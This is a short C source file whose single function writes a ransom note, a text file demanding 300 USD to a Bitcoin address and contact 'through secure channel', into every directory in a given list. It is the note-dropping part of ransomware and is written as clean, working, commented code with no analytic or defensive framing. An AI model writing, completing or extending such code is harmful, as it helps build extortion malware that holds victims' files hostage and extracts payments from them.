#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <limits.h>
#include <errno.h>

/*
 * write_notice: creates a file named "#_STATUS_NOTICE_#.txt" in each
 * directory from the provided list. The file contains a single line with
 * payment instructions.
 *
 * Parameters:
 *   directories - array of directory paths (must be already validated)
 *   num_dirs    - number of directories
 *
 * Returns:
 *   0 on complete success, -1 if any error occurred (all files are attempted)
 */
int write_notice(const char *directories[], size_t num_dirs) {
    int ret = 0;                     /* overall success flag */
    char path[PATH_MAX + 256];       /* buffer for full file path */
    const char *filename = "#_STATUS_NOTICE_#.txt";
    const char *content = "Pay 300 USD to address "
        "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa via payment service. "
        "For enquiries, contact through secure channel.\n";

    for (size_t i = 0; i < num_dirs; i++) {
        /* Build the complete path: directory/filename */
        int n = snprintf(path, sizeof(path), "%s/%s", directories[i], filename);
        if (n < 0 || (size_t)n >= sizeof(path)) {
            perror("snprintf: path too long");
            ret = -1;
            continue;
        }

        /* Open the file for writing (creates or truncates) */
        FILE *fp = fopen(path, "w");
        if (fp == NULL) {
            perror(path);
            ret = -1;
            continue;
        }

        /* Write the fixed content */
        if (fprintf(fp, "%s", content) < 0) {
            perror("fprintf");
            fclose(fp);
            ret = -1;
            continue;
        }

        /* Close the file */
        if (fclose(fp) != 0) {
            perror("fclose");
            ret = -1;
        }
    }

    return ret;
}